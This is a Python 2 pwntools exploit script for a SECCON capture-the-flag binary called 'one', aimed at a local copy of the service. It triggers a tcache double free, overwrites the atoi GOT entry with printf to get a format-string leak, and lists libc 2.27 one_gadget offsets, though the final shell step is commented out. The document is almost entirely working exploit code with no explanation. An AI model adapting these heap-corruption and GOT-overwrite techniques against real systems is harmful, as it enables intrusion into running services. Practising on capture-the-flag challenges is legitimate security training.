#!/usr/bin/env python
from pwn import *


# conn = process("./one_ef36d5ef6169aeda65259f627f282930b93cf6e5")
# conn = remote("one.chal.seccon.jp", 18357)
conn = remote("localhost", 3000)
elf = ELF("./one_ef36d5ef6169aeda65259f627f282930b93cf6e5")
libc = ELF("./libc-2.27.so_18292bd12d37bfaf58e8dded9db7f1f5da1192cb")
one_gadget = [0x4f2c5, 0x4f322, 0x10a38c]


def menu():
    print conn.recvuntil("> ")


def add(name):
    menu()
    print "Add " + str(name)
    conn.sendline("1")
    conn.sendline(name)


def show():
    menu()
    conn.sendline("2")
    # print conn.recvuntil("\n")


def delete():
    menu()
    conn.sendline("3")


def exit():
    menu()
    conn.sendline("0")


def main():
    # add("AAAA" + str(p64(elf.got["puts"])))
    add("AAAAAAAA")
    conn.recvuntil("Done.")
    delete()
    delete()  # double free
    # show()
    # memo_addr = u64(conn.recv(6) + "\x00\x00")
    # print hex(memo_addr)

    add(p64(elf.got["atoi"]))
    add("CCCCCCCC")

    add(p64(elf.got["printf"]))
    print "atoi is printf now"
    # add(p64(one_gadget[0]))
    menu()
    conn.sendline("AAAA%p%p")
    print conn.recvuntil(">")
    print conn.recvuntil("\n")

    # conn.interactive()


if __name__ == "__main__":
    main()
